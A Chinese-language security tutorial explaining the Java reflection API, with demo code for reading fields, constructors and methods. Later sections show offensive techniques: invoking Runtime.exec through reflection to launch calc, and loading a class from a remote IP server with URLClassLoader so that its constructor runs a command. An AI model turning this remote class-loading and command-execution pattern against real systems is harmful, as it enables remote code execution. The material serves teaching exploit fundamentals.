## 反射

Java提供了一套反射API，该API由Class类与java.lang.reflect类库组成。该类库包含了Field、Method、Constructor等类。对成员变量，成员方法和构造方法的信息进行的编程操作可以理解为反射机制

## 为什么反射

其实从官方定义中就能找到其存在的价值，在运行时获得程序或程序集中每一个类型的成员和成员的信息，从而动态的创建、修改、调用、获取其属性，而不需要事先知道运行的对象是谁。划重点：在运行时而不是编译时。（不改变原有代码逻辑，自行运行的时候动态创建和编译即可）

## 应用

Spring框架的IOC基于反射创建对象和设置依赖属性。
SpringMVC的请求调用对应方法，也是通过反射。
JDBC的Class#forName(String className)方法，也是使用反射

## 安全场景

构造利用链，触发命令执行
反序列化中的利用链构造
动态获取或执行任意类中的属性或方法
动态代理的底层原理是反射技术
rmi反序列化也涉及到反射操作

![反射相关类](./images/反射class.jpg)

![反射过去成员变量](./images/getvalue1.jpg)

![反射获取成员方法](./images/getmethod.jpg)

![反射获取构造方法](./images/getconstruct.jpg)

## 演示

### User类

```
package com.user;  
  
public class User {  
    public String name = "qiyi";  
    public int age = 19;  
    private String address = "南岗74";  
    protected String gender = "男";  
  
    public void setName(String name) {  
        this.name = name;  
    }  
  
    public void setAge(int age) {  
        this.age = age;  
    }  
  
    public void setAddress(String address) {  
        this.address = address;  
    }  
  
    public void setGender(String gender) {  
        this.gender = gender;  
    }  
  
    public String getName() {  
        return name;  
    }  
  
    public int getAge() {  
        return age;  
    }  
  
    public String getAddress() {  
        return address;  
    }  
  
    public String getGender() {  
        return gender;  
    }  
    public User() {  
        super();  
    }  
    public User(String name, int age, String address, String gender) {  
        this.name = name;  
        this.age = age;  
        this.address = address;  
        this.gender = gender;  
    }  
    private User(String name, int age, String address) {  
        this.name = name;  
        this.age = age;  
        this.address = address;  
    }  
}
```

### 获取类

```
import com.user.User;  
  
public class GetClass {  
    public static void main(String[] args) throws ClassNotFoundException {  
        //第一种  
        Class<?> aClass = Class.forName("com.user.User");  
        System.out.println(aClass);  
  
        //第二种  
        User user = new User();  
        Class<? extends User> aClass1 = user.getClass();  
        System.out.println(aClass1);  
  
        //第三种  
        Class<User> userClass = User.class;  
        System.out.println(userClass);  
  
        //第四种  
        ClassLoader systemClassLoader = ClassLoader.getSystemClassLoader();  
        Class<?> aClass2 = systemClassLoader.loadClass("com.user.User");  
        System.out.println(aClass2);  
    }  
}
```

### 获取类成员

```
import java.lang.reflect.Field;  
  
public class GetField {  
    public static void main(String[] args) throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException {  
        //先获取类  
        Class<?> aClass = Class.forName("com.user.User");  
  
        //获取公共成员变量  
        Field[] fields = aClass.getFields();  
        for (Field field : fields) {  
            System.out.println(field);  
        }  
  
        //获取所有成员变量  
        Field[] declaredFields = aClass.getDeclaredFields();  
        for (Field field : declaredFields) {  
            System.out.println(field);  
        }  
  
        //获取单个成员变量  
        Field fields1 = aClass.getField("name");  
        System.out.println(fields1);  
        Field address = aClass.getDeclaredField("address");  
        System.out.println(address);  
  
    }  
}
```

### 获取修改类成员值

```
import com.user.User;  
  
import java.lang.reflect.Field;  
  
public class GetFieldContent {  
    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException {  
        //获取user的name值  
        User user = new User();  
        Class<? extends User> aClass = user.getClass();  
        Field field = aClass.getField("name");  
        Object o = field.get(user);  
        System.out.println(o);  
  
        //修改user的name值  
        field.set(user, "qivip");  
        Object o1 = field.get(user);  
        System.out.println(o1);  
  
  
    }  
}
```

### 获取构造方法并实例化生成对象

```
import java.lang.reflect.Constructor;  
  
public class GetConstruct {  
    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException {  
        Class<?> aClass = Class.forName("com.user.User");  
  
        //获取公共构造方法  
        Constructor<?>[] constructors = aClass.getConstructors();  
        for (Constructor<?> constructor : constructors) {  
            System.out.println(constructor);  
        }  
  
        //获取所有构造方法  
        Constructor<?>[] declaredConstructors = aClass.getDeclaredConstructors();  
        for (Constructor<?> constructor : declaredConstructors) {  
            System.out.println(constructor);  
        }  
  
        //获取单个构造方法  
  
        //公共构造  
        Constructor<?> constructor = aClass.getConstructor();  
        System.out.println(constructor);  
        Constructor<?> constructor1 = aClass.getConstructor(String.class, int.class, String.class, String.class);  
        System.out.println(constructor1);  
  
        //私有构造  
        Constructor<?> declaredConstructor = aClass.getDeclaredConstructor(String.class, int.class, String.class);  
        System.out.println(declaredConstructor);  
  
    }  
}
```

```
import com.user.User;  
  
import java.lang.reflect.Constructor;  
import java.lang.reflect.InvocationTargetException;  
  
public class GetclassValue {  
    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException {  
        Class<?> aClass = Class.forName("com.user.User");  
        Constructor<?> declaredConstructor = aClass.getDeclaredConstructor(String.class, int.class, String.class);  
        declaredConstructor.setAccessible(true);  
        User o = (User) declaredConstructor.newInstance("xiaodi", 88, "wuhan");  
        System.out.println(o.getName());  
        System.out.println(o.getAge());  
        System.out.println(o.getAddress());  
        System.out.println(o.getGender());  
    }  
}
```

### 获取成员方法并执行

```
import com.user.User;  
  
import java.lang.reflect.InvocationTargetException;  
import java.lang.reflect.Method;  
  
public class GetMethod {  
    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException {  
        Class<?> aClass = Class.forName("com.user.User");  
  
        //获取所有公共方法  
        Method[] methods = aClass.getMethods();  
        for (Method method : methods) {  
            System.out.println(method.getName());  
        }  
  
        //获取所有方法  
        Method[] declaredMethods = aClass.getDeclaredMethods();  
        for (Method method : declaredMethods) {  
            System.out.println(method.getName());  
        }  
  
        //获取单个方法  
        Method getName = aClass.getMethod("getName");  
        System.out.println(getName.getName());  
  
        Method setName = aClass.getDeclaredMethod("setName", String.class);  
        System.out.println(setName.getName());  
  
        //执行  
        setName.setAccessible(true);  
        User user = new User();  
        setName.invoke(user, "00ing");  
        System.out.println(getName.invoke(user));  
  
    }  
}
```

### 反射调用计算器

```
import java.lang.reflect.InvocationTargetException;  
import java.lang.reflect.Method;  
  
public class ReflectDemo {  
    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException {  
        Class<?> aClass = Class.forName("java.lang.Runtime");  
        Method exec = aClass.getDeclaredMethod("exec", String.class);  
        Method getRuntime = aClass.getDeclaredMethod("getRuntime");  
        Object runtime = getRuntime.invoke(aClass);  
        exec.invoke(runtime, "calc");  
    }  
}
```

### 本地类加载

TestgetRuntime

```
import java.io.IOException;  
  
public class TestgetRuntime {  
    public TestgetRuntime() throws IOException {  
        Runtime.getRuntime().exec("calc");  
    }  
}
```

javac TestgetRuntime.java 编译成class文件

类加载器

```
import    java.io.File;  
import java.net.MalformedURLException;  
import java.net.URI;  
import java.net.URL;  
import java.net.URLClassLoader;  
  
public class ClassLoaderlocal {  
    public static void main(String[] args) throws MalformedURLException, ClassNotFoundException, InstantiationException, IllegalAccessException {  
        File file = new File(".\\");  
        URI uri = file.toURI();  
        URL url = uri.toURL();  
        URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{url});  
        Class<?> aClass = urlClassLoader.loadClass("TestgetRuntime");  
        aClass.newInstance();  
    }  
}
```

### 远程类加载

```
import java.net.MalformedURLException;  
import java.net.URL;  
import java.net.URLClassLoader;  
  
public class URLloader {  
    public static void main(String[] args) throws MalformedURLException, ClassNotFoundException, InstantiationException, IllegalAccessException {  
        URL url = new URL("http://39.99.42.172:5566/");  
        URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{url});  
        Class<?> aClass = urlClassLoader.loadClass("TestgetRuntime");  
        aClass.newInstance();  
    }  
}
```

class文件放在服务器根目录下